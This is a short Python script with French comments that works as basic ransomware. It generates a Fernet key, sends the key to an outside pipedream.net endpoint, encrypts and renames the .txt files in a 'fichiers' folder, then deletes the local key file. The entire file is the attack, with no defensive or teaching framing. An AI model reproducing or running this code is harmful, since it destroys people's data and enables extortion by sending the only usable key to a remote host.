from cryptography.fernet import Fernet
import os
import glob
import random
import string
import requests

def write_key():
    """
    Générer la clé
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

    with open("key.key", "rb") as key_file:
        key = key_file.read()

    r = requests.post("https://enoec5erdnbzawd.m.pipedream.net", data={"key": key}, headers={'Content - Type': 'application / json'})

def load_key():
    """
    Charge la clé
    """
    return open("key.key", "rb").read()

def kill_key():
    os.remove("key.key")

def encrypt(dir, key):
    f = Fernet(key)
    for filename in glob.glob(os.path.join(dir, '*.txt')):
        with open(filename, 'r') as file:
            file_data = file.read()
            encrypted_data = f.encrypt(file_data.encode())
        with open(filename, "wb") as new:
            new.write(encrypted_data)

        extension = str(filename).split(".")[1]
        name = str(''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(10)))
        os.rename(filename, dir + "/" + name + "." + extension)

def decrypt(dir, key):
    global decrypted_data
    f = Fernet(key)
    for filename in glob.glob(os.path.join(dir, '*.txt')):
        with open(filename, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(filename, "wb") as file:
            file.write(decrypted_data)

key = load_key()
dir = "fichiers"

encrypt(dir, key)
kill_key()